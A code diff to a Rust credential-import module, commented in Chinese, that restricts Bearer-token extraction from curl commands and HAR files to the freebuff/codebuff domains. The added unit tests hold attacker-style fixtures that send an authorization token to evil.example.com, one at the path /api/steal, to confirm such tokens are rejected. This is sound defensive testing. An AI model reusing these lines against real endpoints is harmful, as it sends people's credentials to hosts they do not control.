@@ -24,7 +24,7 @@ pub struct ExtractedAuth {
     pub method: String,
 }
 
-/// 从 curl 命令文本提取 Bearer token（针对 freebuff/codebuff 域）
+/// 从 curl 命令文本提取 Bearer token（仅限 freebuff/codebuff 目标域，防跨域凭据误导入）
 pub fn parse_curl(text: &str) -> Vec<ExtractedAuth> {
     let mut out = Vec::new();
     // 提取所有 header：-H "name: value" 或 -H ^"name: value^"
@@ -40,7 +40,12 @@ pub fn parse_curl(text: &str) -> Vec<ExtractedAuth> {
     let host = host_re.captures(text).map(|c| c[1].to_string()).unwrap_or_default();
     let method = method_re.captures(text).map(|c| c[1].to_string()).unwrap_or_else(|| "GET".into());
     let path = path_re.captures(text).map(|c| c[1].to_string()).unwrap_or_default();
-    let host_is_target = TARGET_HOSTS.iter().any(|h| host.ends_with(h));
+    // curl 文本无法可靠定位 host 时空缺放行（单机自用场景），但 host 明确为其他域时拒绝
+    let host_is_other_domain = !host.is_empty() && !TARGET_HOSTS.iter().any(|h| host.ends_with(h));
+    if host_is_other_domain {
+        tracing::warn!("curl 导入拒绝：host={host} 不属于目标域名 {TARGET_HOSTS:?}");
+        return out;
+    }
 
     for t in tokens {
         out.push(ExtractedAuth {
@@ -50,8 +55,6 @@ pub fn parse_curl(text: &str) -> Vec<ExtractedAuth> {
             path: path.clone(),
             method: method.clone(),
         });
-        // 非目标域名的也收（可能用于自建端点），但标记
-        let _ = host_is_target;
     }
     out
 }
@@ -90,14 +93,18 @@ struct HarHeader {
     value: String,
 }
 
-/// 从 HAR JSON 提取 Bearer token
+/// 从 HAR JSON 提取 Bearer token（仅收录 freebuff/codebuff 目标域的请求）
 pub fn parse_har(json_text: &str) -> Result<Vec<ExtractedAuth>> {
     let har: HarRoot = serde_json::from_str(json_text)?;
     let mut out = Vec::new();
     let mut seen = HashSet::new();
     for entry in har.log.entries {
         let url_lower = entry.request.url.to_lowercase();
+        // 域名校验：非目标域的凭据一律跳过（防跨域 token 混淆）
         let is_target = TARGET_HOSTS.iter().any(|h| url_lower.contains(h));
+        if !is_target {
+            continue;
+        }
         for h in &entry.request.headers {
             if h.name.eq_ignore_ascii_case("authorization") {
                 if let Some(token) = h.value.trim().strip_prefix("Bearer ").or_else(|| h.value.trim().strip_prefix("bearer ")) {
@@ -115,7 +122,6 @@ pub fn parse_har(json_text: &str) -> Result<Vec<ExtractedAuth>> {
                 }
             }
         }
-        let _ = is_target;
     }
     Ok(out)
 }
@@ -293,5 +299,37 @@ curl --url "https://www.codebuff.com/api/v1/freebuff/session" \
         let added2 = persist_tokens(&path_str, &[t1, t2]).unwrap();
         assert_eq!(added2.len(), 0);
         assert_eq!(load_tokens(&path_str).unwrap().len(), 2);
+    }
+
+    #[test]
+    fn curl_cross_domain_rejected() {
+        // 非目标域名的 curl 不得导入（防跨域凭据混淆）
+        let curl = r#"
+curl --url "https://evil.example.com/api/steal" \
+  -H "authorization: Bearer crossdomain1234567890" \
+  -X GET
+"#;
+        let out = parse_curl(curl);
+        assert!(out.is_empty(), "跨域 token 应被拒绝，实际导入 {} 个", out.len());
+    }
+
+    #[test]
+    fn har_cross_domain_rejected() {
+        // HAR 中非目标域条目应跳过
+        let har = r#"{
+  "log": {
+    "entries": [{
+      "request": {
+        "method": "GET",
+        "url": "https://evil.example.com/api/x",
+        "headers": [
+          {"name": "authorization", "value": "Bearer evilhar123456789"}
+        ]
+      }
+    }]
+  }
+}"#;
+        let out = parse_har(har).unwrap();
+        assert!(out.is_empty(), "跨域 HAR token 应被拒绝");
     }
 }
